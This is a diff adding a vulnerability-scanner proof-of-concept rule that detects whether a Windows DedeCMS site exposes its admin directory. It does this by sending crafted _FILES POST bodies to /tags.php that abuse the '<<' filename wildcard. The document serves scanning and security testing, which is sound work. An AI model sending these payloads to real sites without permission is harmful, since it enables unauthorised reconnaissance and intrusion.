@@ -1,0 +1,33 @@
+name: poc-yaml-dedecms-win-admin-dir-enum
+set:
+  r1: randomLowercase(8)
+rules:
+  - method: GET
+    path: /images/dede.gif
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type == "image/gif"
+  - method: GET
+    path: /IMAGES/DEDE.GIF
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.content_type == "image/gif"
+  - method: POST
+    path: /tags.php
+    body: >-
+      _FILES[mochazz][tmp_name]=./imag<</dede.gif&_FILES[mochazz][name]=0&_FILES[mochazz][size]=0&_FILES[mochazz][type]=image/gif
+    follow_redirects: false
+    expression: |
+      response.status == 200
+  - method: POST
+    path: /tags.php
+    body: >-
+      _FILES[mochazz][tmp_name]=./{{r1}}<</dede.gif&_FILES[mochazz][name]=0&_FILES[mochazz][size]=0&_FILES[mochazz][type]=image/gif
+    follow_redirects: false
+    expression: |
+      response.status == 200 && string(response.body) == "Upload filetype not allow !"
+detail:
+  author: last0monster(https://github.com/last0monster)
+  effect_version: dedecms
+  links:
+    - https://www.freebuf.com/column/163805.html
